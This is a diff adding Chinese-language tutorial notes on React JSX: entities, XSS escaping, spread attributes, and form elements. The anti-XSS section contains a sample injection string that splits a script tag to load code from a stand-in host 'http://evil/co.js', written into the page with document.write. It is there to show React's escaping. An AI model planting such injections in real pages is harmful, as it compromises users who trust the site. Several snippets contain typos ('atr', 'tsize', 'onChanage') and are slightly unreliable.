@@ -1941,3 +1941,407 @@ JSX裡的空白類似HTML，但不全然：
 ```
 
 這個範例產生「右向箭頭」。
+
+```
+More info »
+```
+
+如果使用實體作為表達式一部分，會遇到雙重編碼的問題：
+
+```
+<h2>
+    {"More info &raquo;"}
+</h2>
+```
+
+HTML被編碼過：
+
+```
+More info &raquo;
+```
+
+為了防止雙重編碼，你可使用HTML實體的Unicode版本，參見[https://dev.w3.org/html5/html-author/charref](https://dev.w3.org/html5/html-author/charref)
+
+```
+<h2>
+    {"More info \u00bb"}
+</h2>
+```
+
+為求方便，可在模組頂端某處定義常數，附帶任何需要的間隔，然後，在需要的地方使用這便捷的常數：
+
+```
+const RAQUO = ' \u00bb';
+
+<h2>
+    {"More info" + RAQUO}
+</h2>
+<h2>
+    {"More info"}{RAQUO}
+</h2>
+```
+
+### 反跨網站指令稿攻擊
+
+為什麼非得突破層層困難使用HTML實體？有很好的理由超越附帶的缺點：對抗跨網站指令稿攻擊(Anti-XSS)：
+
+React脫逸(escape)所有的字串，防止XSS類型的攻擊：
+
+```
+var firstname = 'John<scr'+'ipt src="http://evil/co.js"></scr' + 'ipt>';
+```
+
+某些情況下，你最後可能會把這字串寫入DOM：
+
+```
+document.write(firstname);
+```
+
+這是一場災難，頁面顯示John，但`<script>`標籤加載惡意的JavaScript，危害你的應用程式以及信任你的使用者。還好，React自動保護妳免於這樣的困境：
+
+```
+ReactDOM.render(
+        <h2>
+            Hello {firstname}!
+        </h2>,
+    document.getElementById("app")
+);
+```
+
+...React自動脫逸firstname的內容：
+
+```
+Hello John<script src="http://evil/co.js"></script>!
+```
+
+## 傳播屬性
+
+JSX從ECMAScript6借用一項稱作**展開運算子**(spread operator)的有用功能，並且使用它作為一種定義特性的方便機制：
+
+想像一下，你想將一群屬性傳遞給<a>元件：
+
+```
+var attr = {
+    href: 'http://example.org',
+    target: '_blank'
+};
+```
+
+你總可這樣做：
+
+```
+return (
+  <a
+    href={attr.href}
+    target={atr.target}>
+    Hello
+  </a>
+);
+```
+
+然而，這感覺好像大量樣板程式碼(boilerplate code)，透過使用展開運算子(傳播屬性)，只需一行程式碼即可完成這項工作：
+
+```
+return <a {...attr}>Hello</a>;
+```
+
+範例中，你擁有想要事先定義(或有條件地)的屬性物件，這本身很有用，但更常見的用途是你從外部取得這個屬性物件 —— 經常是父元件。
+
+### 父元件對子元件傳播屬性
+
+你希望該元件接受所有`<a>`接受的屬性，再加上一些其他的屬性，人們可這樣使用你的元件：
+
+```
+<FancyLink
+        href="http://example.org"
+        style={ {color: "red"} }
+        target="_blank"
+        size="medium">
+    Hello
+</FancyLink>
+```
+
+你的render()函式如何善用屬性傳播的優點，避免重新定義`<a>`的所有屬性？
+
+```
+var FancyLink = React.createClass({
+    render: function () {
+        switch (this.props.size) {
+            // 基於`size`特性做一些事情
+        }
+
+        return <a {...this.props}>{this.props.children}</a>
+    }
+});
+```
+
+※ `this.props.children`：讓任意數量的子元件被傳遞給你的元件，並讓你在建構你的介面時可存取他們
+
+前面程式碼片段中，直接將所有特性帶給`<a>`，包括size特性，React.DOM.a沒有size的概念，所以它只是靜靜被忽略。
+
+你可做更好一點，不傳遞不需要的特性：
+
+```
+var FancyLink = React.createClass({
+    render: function () {
+        switch (this.props.size) {
+            // 基於`size`特性做一些事情
+        }
+
+        var attribs = Object.assign({}, this.props);
+        delete attribs.size;
+
+        return <a {...attribs}>{this.props.children}</a>
+    }
+});
+```
+
+使用ECMAScript7提議的語法，就不需使用任何複製：
+
+```
+var FancyLink = React.createClass({
+    render: function () {
+
+        var {size, ...attribs} = this.props;
+
+        switch (tsize) {
+            // 基於`size`特性做一些事情
+        }
+
+        return <a {...attribs}>{this.props.children}</a>
+    }
+});
+```
+
+## 在JSX中回傳多個節點
+
+你總是必須從render()函式回傳單一節點，回傳兩個節點是不允許的。不過這很容易修正，只要將所有節點包裏在另一個元件中，例如，`<div>`。
+
+```
+var Example = React.createClass({
+    render: function() {
+        return (
+            <div>
+                <span>
+                    Hello
+                </span>
+                <span>
+                    {' '}World
+                </span>
+            </div>
+        );
+    }
+});
+```
+
+可在建構過程中使用陣列，只要陣列節點具適當的key屬性：
+
+```
+var Example = React.createClass({
+    render: function () {
+
+        var greeting = [
+            <span key="greet">Hello</span>,
+            ' ',
+            <span key="world">World</span>
+        ];
+
+        return (
+                <div>
+                    {greeting}
+                </div>
+        );
+    }
+});
+```
+
+可偷偷塞空白進陣列，這種東西不需要key。
+
+某種程度上，就像接受由父元件傳遞任何數量的元件，並將它們傳遞到你的render()函式：
+
+```
+var Example = React.createClass({
+    render: function () {
+        console.log(this.props.children.length);
+        return (
+            <div>{this.props.children}</div>
+        )
+    }
+});
+
+ReactDOM.render(
+        <Example>
+            <span key="greet">Hello</span>
+            {' '}
+            <span key="world">World</span>
+            !
+        </Example>,
+    document.getElementById("app")
+);
+```
+
+## JSX與HTML的差異
+
+JSX像HTML，但比較容易添加動態值、迴圈、和條件(只要將他們包裏在{})。現在來考慮HTML和JSX之間的差異：
+
+### 沒有class，為什麼？
+
+代替class與for屬性(兩個都是ECMAScript的保留字)，你必須使用className與htmlFor。
+
+### style是物件
+
+style屬性接受物件值，而不是以分號相隔的字串，另外，CSS特性的名稱是camelCase(駝峰式)，而非dash-delimited(以破折號分隔)：
+
+```
+var styles = {
+  fontSize: '2em',
+  lineHeight: '1.6'
+};
+var em = <em style={styles} />;
+```
+
+```
+var em = <em style={ {fontSize: '2em', lineHeight: '1.6'} } />;
+```
+
+### 關閉標籤
+
+在HTML中，有些標籤不需要關閉；在JSX(XML)中，它們必須關閉。
+
+### 駝峰式屬性
+
+在JSX中，所有屬性必須採取駝峰式命名：
+
+```
+var a = <a onClick={reticulateSplines} />;
+```
+
+此規則的例外是所有以`data-`與`aria-`作為前綴的屬性；就像在HTML中那樣。
+
+## JSX與表單
+
+就處理表單而言，JSX與HTML之間存在一些差異。
+
+### onChange處理器
+
+使用表單元素時，使用者在互動過程中改變它們的值。在React中，你可使用onChanage訂閱這類變更，這樣做遠比使用單選按鈕和複選方框的checked值，`<select>`選項的selected值來得一致。此外，輸入textarea與`<input type="text">`欄位時，onChange隨著使用者輸入而觸發，遠比元素失去焦點才觸發來得有用，這表示，不再訂閱所有類型的滑鼠與鍵盤事件，而只是監看輸入變更。
+
+### value vs. defaultValue
+
+HTML中，如果你有`<input id="i" value="hello"/>`，然後透過輸入"bye"更改這個值，那麼...
+
+```
+i.value;  // bye
+i.getAttribute('value'); // "hello"
+```
+
+在React中，value特性總具有文字輸入欄位的最新內容，如果想要指定預設值，你可使用defaultValue。
+
+以下刪除“hello”裡的最後一個“o”，導致value變成“hell”，defaultValue還是“hello”：
+
+```
+function log(evt) {
+    console.log("value: ", evt.target.value);
+    console.log("defaultValue: ", evt.target.defaultValue);
+}
+ReactDOM.render(
+    <input defaultValue="hello" onChange={log}/>,
+    document.getElementById("app")
+);
+```
+
+(實際測試defaultValue為空...)
+
+※ 這是你應該在自己的元件中使用的模式：如果你接受某個暗示它應該是最新資料的特性(例如：value、data)，就讓它保持當前狀態。如果沒有，就稱之為initialData，defaultValue或類似的東西，以便符合預期與直覺。
+
+### <textarea>的值
+
+為了讓文字輸入欄位一致，React版本的`<textarea>`接受value和defaultValue特性，讓value保持最新狀態，defaultValue保持原始狀態，如果你採取HTML風格，並使用textarea的子元素來定義值(不建議)，那會被看成好像是defaultValue。
+
+HTML<textarea>接受子元素作為它的值，就是為了讓開發者可以在輸入欄位中使用「新行」，然後，React(全是JavaScript)並沒有這種限制，當你需要新行，就使用`\n`。
+
+```
+function log(event) {
+    console.log("value: ", event.target.value);
+    console.log("defaultValue: ", event.target.defaultValue);
+}
+
+ReactDOM.render(
+    <textarea defaultValue="hello\nworld" onChange={log}/>,
+    document.getElementById("app1")
+);
+ReactDOM.render(
+        <textarea defaultValue={"hello\nworld"} onChange={log}/>,
+    document.getElementById("app2")
+);
+ReactDOM.render(
+        <textarea onChange={log}>hello
+        world
+        </textarea>,
+    document.getElementById("app3")
+);
+ReactDOM.render(
+        <textarea onChange={log}>{"hello\n\
+        world"}</textarea>,
+    document.getElementById("app4")
+);
+```
+
+![在textarea裡的新行](./textarea.png)
+
+React會警告你正在使用舊式的`<textarea>`子元件設定值。
+
+### <select>的值
+
+使用HTML的`<select>`輸入元素時，你可利用`<option selected>`指定預選的項目，就像這樣：
+
+```
+<select>
+  <option value="stay">Should I stay</option>
+  <option value="move" selected>or should I go</option>
+</select>
+```
+
+在React中，你在<select>元素上指定value，甚至defaultValue：
+
+```
+<select value="move">
+    <option value="stay">Should I stay</option>
+    <option value="move">or should I go</option>
+    <option value="trouble">If I stay it will be trouble</option>
+</select>
+```
+
+當具多個選項時，你只需要提供由預選值構成的陣列：
+
+```
+<select defaultValue={["stay", "move"]} multiple={true}>
+    <option value="stay">Should I stay</option>
+    <option value="move">or should I go</option>
+    <option value="trouble">If I stay it will be trouble</option>
+</select>
+```
+
+※ 如果搞混，並且設定`<option>` selected屬性，React會警告你。
+
+使用`<select value>`代替`<select defaultValue>`也是允許的，但不建議，因為它需要你負責更新使用者看到的值，否則，使用者選擇不同的選項時，`<select>`保持不變，你必須這樣做：
+
+```
+var MySelect = React.createClass({
+    getInitialState: function () {
+        return { value: 'move' }
+    },
+    _onChange: function (evt) {
+        this.setState({value: evt.target.value})
+    },
+    render: function () {
+        return (
+            <select value={this.state.value} onChange={this._onChange}>
+                <option value="stay">Should I stay</option>
+                <option value="move">or should I go</option>
+                <option value="trouble">If I stay it will be trouble</option>
+            </select>
+        );
+    }
+});
+```
